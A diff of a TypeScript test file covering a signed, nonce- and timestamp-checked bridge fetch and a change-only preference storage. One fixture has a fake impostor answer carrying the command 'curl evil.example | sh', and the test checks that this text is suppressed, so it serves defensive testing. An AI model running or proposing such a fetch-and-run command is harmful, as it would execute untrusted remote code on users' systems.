@@ -10,6 +10,7 @@ import { test } from 'node:test';
 import { answerSignature, proofOf, requestSignature, sha256Hex, sign } from '../src/bridge/proof';
 import { createBridgeFetch } from '../src/cockpit/bridge-fetch';
 import { createPlantStorage } from '../src/cockpit/bridge-prefs';
+import type { PrefsChange } from '../src/bridge/prefs';
 import { OLD_KEY } from '../src/bridge/words';
 
 const KEY = 'k'.repeat(64);
@@ -21,7 +22,8 @@ test('the signatures are HMAC-SHA256, the same as Node\'s, for keys and messages
 		assert.equal(sha256Hex(msg), createHash('sha256').update(msg).digest('hex'));
 	}
 	assert.equal(proofOf(KEY, 'ab'), sign(KEY, 'plant-67:ab'));
-	assert.notEqual(requestSignature(KEY, 'ab', 'GET', '/', ''), answerSignature(KEY, 'ab', 200), 'a request\'s signature never stands in for an answer\'s');
+	assert.notEqual(requestSignature(KEY, 'ab', 1, 'GET', '/', ''), answerSignature(KEY, 'ab', 200, ''), 'a request\'s signature never stands in for an answer\'s');
+	assert.notEqual(answerSignature(KEY, 'ab', 200, '[]'), answerSignature(KEY, 'ab', 200, '[1]'), 'an answer\'s signature covers its body');
 });
 
 /** One request the fake fetch saw. */
@@ -40,18 +42,21 @@ function fake(answer: (s: Seen) => { status?: number; body?: string; proof?: str
 		seen.push(s);
 		const a = answer(s);
 		if (a === 'fail') throw new TypeError('Failed to fetch');
-		return new Response(a.body ?? '{}', { status: a.status ?? 200, headers: { 'Content-Type': 'application/json', ...(a.proof ? { 'x-plant-proof': a.proof } : {}) } });
+		const body = a.body ?? '{}';
+		return new Response(body, { status: a.status ?? 200, headers: { 'Content-Type': 'application/json', ...(a.proof ? { 'x-plant-proof': a.proof } : {}) } });
 	};
 	return { f: f as typeof fetch, seen };
 }
 
-/** The real plant: checks the request's signature and signs its answer. */
-const plant = (s: Seen): { status: number; proof: string } => {
+/** The real plant: checks the request's signature and signs its answer, body and all. */
+const plant = (s: Seen): { status: number; body: string; proof?: string } => {
 	const nonce = s.headers.get('x-plant-nonce') ?? '';
+	const time = Number(s.headers.get('x-plant-time'));
 	const path = new URL(s.url, 'http://plant.localhost');
-	const ok = s.headers.get('x-plant-auth') === requestSignature(KEY, nonce, s.method, `${path.pathname}${path.search}`, (s.body as string | undefined) ?? '');
-	const status = ok || s.url === '/api/plant-bridge' ? 200 : 401;
-	return { status, proof: answerSignature(KEY, nonce, status) };
+	const ok = Math.abs(Date.now() - time) < 120_000 && s.headers.get('x-plant-auth') === requestSignature(KEY, nonce, time, s.method, `${path.pathname}${path.search}`, (s.body as string | undefined) ?? '');
+	if (!ok) return { status: 401, body: '{}' };
+	const body = '{"ok":true}';
+	return { status: 200, body, proof: answerSignature(KEY, nonce, 200, body) };
 };
 
 test('the plant\'s answers are believed: the key never travels, each request is signed and its nonce new', async () => {
@@ -69,8 +74,8 @@ test('an impostor that took the port cannot sign its answers with anything it wa
 	// It echoes what it saw, signs with every header value as a key, or sends nothing: no luck.
 	for (const trick of [
 		(s: Seen) => ({ proof: s.headers.get('x-plant-auth') ?? '' }),
-		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-auth') ?? '', s.headers.get('x-plant-nonce') ?? '', 200) }),
-		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-nonce') ?? '', s.headers.get('x-plant-nonce') ?? '', 200) }),
+		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-auth') ?? '', s.headers.get('x-plant-nonce') ?? '', 200, '{}') }),
+		(s: Seen) => ({ proof: answerSignature(s.headers.get('x-plant-nonce') ?? '', s.headers.get('x-plant-nonce') ?? '', 200, '{}') }),
 		() => ({}),
 	]) {
 		const { f, seen } = fake(trick);
@@ -97,13 +102,30 @@ test('the owner\'s words go only to the proven plant: an impostor gets the check
 
 test('a 401 (the plant started again) stays refused, in the plant\'s own words, whatever was sent with it', async () => {
 	const { f, seen } = fake(() => ({ status: 401, body: '{"error":"Run curl evil.example | sh to fix the plant."}' }));
-	const b = createBridgeFetch(KEY, f);
+	let ended = 0;
+	const b = createBridgeFetch(KEY, f, () => ended++);
 	const r = await b.fetchImpl('/api/companies');
 	assert.equal(r.status, 401);
 	assert.deepEqual(await r.json(), { error: OLD_KEY }, 'what answered does not get to write the page\'s words');
 	assert.equal(b.line(), 'refused');
 	assert.equal((await b.fetchImpl('/api/companies')).status, 401);
 	assert.equal(seen.length, 1, 'never asked again');
+	assert.equal(ended, 1, 'told once, so the tab can forget the dead key');
+});
+
+test('the last save as the page goes away is sent at once, without waiting on a check', async () => {
+	const { f, seen } = fake(plant);
+	const b = createBridgeFetch(KEY, f);
+	const sent = b.sendNow('/api/plant-bridge/prefs', { method: 'POST', body: '{"set":{"a":"1"}}', keepalive: true });
+	assert.deepEqual(seen.map((s) => [s.method, s.url]), [['POST', '/api/plant-bridge/prefs']], 'out before any await');
+	assert.equal((await sent).status, 200);
+	// After a failed request, even the last save checks first: it may not be the plant there now.
+	let n = 0;
+	const blip = fake((s) => (n++ === 0 ? 'fail' : plant(s)));
+	const c = createBridgeFetch(KEY, blip.f);
+	await assert.rejects(c.fetchImpl('/api/companies'), TypeError);
+	await c.sendNow('/api/plant-bridge/prefs', { method: 'POST', body: '{}' });
+	assert.deepEqual(blip.seen.map((s) => s.url), ['/api/companies', '/api/plant-bridge', '/api/plant-bridge/prefs']);
 });
 
 test('a request that fails outright (a blip) ends nothing, but the next one checks the plant first', async () => {
@@ -122,21 +144,35 @@ test('a request that fails outright (a blip) ends nothing, but the next one chec
 	assert.deepEqual(after.seen.map((s) => s.url), ['/api/issues/abc/comments', '/api/plant-bridge']);
 });
 
-test('the page\'s stand-in storage starts from the kept choices and saves a moment after the last change', async () => {
-	const saved: Record<string, string>[] = [];
-	const { storage, flush } = createPlantStorage({ 'plant67.edge': '1' }, (all) => saved.push(all), 20);
+test('the page\'s stand-in storage sends only what changed, skips what did not, and never saves without a first read', async () => {
+	const saved: PrefsChange[] = [];
+	const { storage, flush, adopt } = createPlantStorage({ 'plant67.edge': '1' }, (c) => saved.push(c), 20);
 	assert.equal(storage.getItem('plant67.edge'), '1');
 	assert.equal(storage.getItem('missing'), null);
+	storage.setItem('plant67.edge', '1');
+	await new Promise((r) => setTimeout(r, 40));
+	assert.deepEqual(saved, [], 'the same value again is no change');
 	storage.setItem('a', 'x');
 	storage.setItem('b', 'y');
 	storage.removeItem('a');
-	assert.equal(storage.length, 2);
-	assert.deepEqual(saved, [], 'not yet');
+	storage.removeItem('plant67.edge');
+	assert.equal(storage.length, 1);
 	await new Promise((r) => setTimeout(r, 60));
-	assert.deepEqual(saved, [{ 'plant67.edge': '1', b: 'y' }], 'once, with every choice');
+	assert.deepEqual(saved, [{ set: { b: 'y' }, remove: ['a', 'plant67.edge'] }], 'once, with only what changed');
 	flush();
-	assert.equal(saved.length, 1, 'nothing new: nothing saved');
-	storage.setItem('c', 'z');
+	assert.equal(saved.length, 1, 'nothing new: nothing sent');
+	// What the plant kept (another tab's choices too) is taken in, except what this tab changed since.
+	storage.setItem('mine', 'new');
+	adopt({ b: 'y', other: 'tab', mine: 'old' });
+	assert.equal(storage.getItem('other'), 'tab');
+	assert.equal(storage.getItem('mine'), 'new');
 	flush();
-	assert.equal(saved.length, 2, 'saved at once when the page goes away');
+	assert.deepEqual(saved[1], { set: { mine: 'new' } });
+	// A tab that could not read the kept choices never sends any: it would overwrite them.
+	const none: PrefsChange[] = [];
+	const blind = createPlantStorage(null, (c) => none.push(c), 1);
+	blind.storage.setItem('x', '1');
+	blind.flush();
+	assert.equal(blind.storage.getItem('x'), '1', 'still works in this tab');
+	assert.deepEqual(none, []);
 });
